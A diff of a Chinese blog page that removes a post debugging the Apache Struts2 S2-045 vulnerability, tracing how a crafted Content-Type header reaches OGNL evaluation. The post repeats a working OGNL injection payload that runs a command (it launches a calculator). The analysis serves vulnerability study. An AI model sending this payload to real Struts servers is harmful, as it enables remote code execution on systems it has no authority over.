-<p>此处有两个关注点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1）if (content_type != null &amp;&amp; content_type.contains(&quot;multipart/form-data&quot;)) &#123;</span><br></pre></td></tr></table></figure></p>
-<p>S2-045的POC一般都有(#nike=’multipart/form-data’)这样一句，就是使content_type.contains(“multipart/form-data”)判断为true<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2）MultiPartRequest mpr = getMultiPartRequest();</span><br></pre></td></tr></table></figure></p>
-<p>继续追踪getMultiPartRequest方法。通过配置struts.multipart.parser属性，可以指定不同的解析类，而默认就是org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest类。</p>
-<h4 id="3-加断点动态测试"><a href="#3-加断点动态测试" class="headerlink" title="3) 加断点动态测试"></a>3) 加断点动态测试</h4><p>弹出计算器POC：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: haha~multipart/form-data %&#123;#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(&apos;calc&apos;)&#125;;</span><br></pre></td></tr></table></figure></p>
-<h5 id="JakartaMultiPartRequest-java-buildErrorMessage"><a href="#JakartaMultiPartRequest-java-buildErrorMessage" class="headerlink" title="JakartaMultiPartRequest.java - buildErrorMessage()"></a>JakartaMultiPartRequest.java - buildErrorMessage()</h5><p>路径struts-2.3.20\src\core\src\main\java\org\apache\struts2\dispatcher\multipart<br>在return LocalizedTextUtil.findText()处加断点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">protected String buildErrorMessage(Throwable e, Object[] args) &#123;</span><br><span class="line">      String errorKey = &quot;struts.messages.upload.error.&quot; + e.getClass().getSimpleName();</span><br><span class="line">      if (LOG.isDebugEnabled()) &#123;</span><br><span class="line">          LOG.debug(&quot;Preparing error message for key: [#0]&quot;, errorKey);</span><br><span class="line">      &#125;</span><br><span class="line">      return LocalizedTextUtil.findText(this.getClass(), errorKey, defaultLocale, e.getMessage(), args); //加断点</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122929-c7053b04-b31f-1.png" alt=""><br>到达断点return LocalizedTextUtil.findText()，执行下一步，即可弹出计算器：<br>此时e的值为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.commons.fileupload.FileUploadBase$InvalidContentTypeException: the request doesn&apos;t contain a multipart/form-data or multipart/mixed stream, content type header is haha~multipart/form-data %&#123;#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(&apos;calc&apos;)&#125;;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122930-c71ee0d6-b31f-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122930-c73e41e2-b31f-1.png" alt=""></p>
-<p>下面到达断点return LocalizedTextUtil.findText() 然后跟进findText()方法继续调试</p>
-<h5 id="LocalizedTextUtil-java"><a href="#LocalizedTextUtil-java" class="headerlink" title="LocalizedTextUtil.java"></a>LocalizedTextUtil.java</h5><p>路径struts-2.3.20\src\xwork-core\src\main\java\com\opensymphony\xwork2\util\ LocalizedTextUtil.java</p>
-<h6 id="findText"><a href="#findText" class="headerlink" title="findText()"></a>findText()</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return LocalizedTextUtil.findText(this.getClass(), errorKey, defaultLocale, e.getMessage(), args);</span><br></pre></td></tr></table></figure>
-<p>跟进LocalizedTextUtil.findText()<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122930-c74ea9c4-b31f-1.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return findText(aClass, aTextName, locale, defaultMessage, args, valueStack);</span><br></pre></td></tr></table></figure></p>
-<p>继续跟进return findText()</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">此时indexedTextName为：null</span><br><span class="line">defaultMessage为：</span><br><span class="line">the request doesn&apos;t contain a multipart/form-data or multipart/mixed stream, content type header is haha~multipart/form-data %&#123;#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(&apos;calc&apos;)&#125;;</span><br></pre></td></tr></table></figure>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122930-c76c9560-b31f-1.png" alt=""></p>
-<h6 id="getDefaultMessage"><a href="#getDefaultMessage" class="headerlink" title="getDefaultMessage()"></a>getDefaultMessage()</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = getDefaultMessage(aTextName, locale, valueStack, args, defaultMessage);</span><br></pre></td></tr></table></figure>
-<p>继续跟进getDefaultMessage()<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122930-c77f3e04-b31f-1.png" alt=""></p>
-<h5 id="TextParseUtil-java-translateVariables"><a href="#TextParseUtil-java-translateVariables" class="headerlink" title="TextParseUtil.java - translateVariables()"></a>TextParseUtil.java - translateVariables()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MessageFormat mf = buildMessageFormat(TextParseUtil.translateVariables(message, valueStack), locale);</span><br></pre></td></tr></table></figure>
-<p> 继续跟进 translateVariables()<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122930-c78d3798-b31f-1.png" alt=""></p>
-<p>translateVariables()方法使用了 ognl 的 $ 与 % 标签，两者都能告诉执行环境 ${} 或 %{} 中的内容为ognl表达式。所以POC中使用 % 或者$ 都可以触发漏洞。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return parser.evaluate(openChars, expression, ognlEval, maxLoopCount);</span><br></pre></td></tr></table></figure>
-<p>继续跟进return translateVariables()<br>最后调用了evaluate()方法解析OGNL，执行代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此时expression值为the request doesn&apos;t contain a multipart/form-data or multipart/mixed stream, content type header is haha~multipart/form-data %&#123;#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(&apos;calc&apos;)&#125;;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122930-c79df998-b31f-1.png" alt=""></p>
-<h5 id="evaluate-方法说明"><a href="#evaluate-方法说明" class="headerlink" title="evaluate()方法说明"></a>evaluate()方法说明</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParsedValueEvaluator ognlEval = new ParsedValueEvaluator() &#123;</span><br></pre></td></tr></table></figure>
-<p>跟进ParsedValueEvaluator()<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122930-c7aa855a-b31f-1.png" alt=""><br>translateVariables()方法继承接口com.opensymphony.xwork2.util.TextParseUtil.ParsedValueEvaluator<br>在创建对象后重写了evaluate()方法<br>通过该方法的说明文档可知evaluate()方法会解析ognl表达式<br><a href="https://struts.apache.org/maven/struts2-core/apidocs/com/opensymphony/xwork2/util/TextParseUtil.ParsedValueEvaluator.html" target="_blank" rel="noopener">https://struts.apache.org/maven/struts2-core/apidocs/com/opensymphony/xwork2/util/TextParseUtil.ParsedValueEvaluator.html</a><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908122931-c7bf49f4-b31f-1.png" alt=""></p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h3><p><a href="https://paper.seebug.org/241/" target="_blank" rel="noopener">https://paper.seebug.org/241/</a><br><a href="https://paper.seebug.org/247/" target="_blank" rel="noopener">https://paper.seebug.org/247/</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1997,7 +1987,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-count">15</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
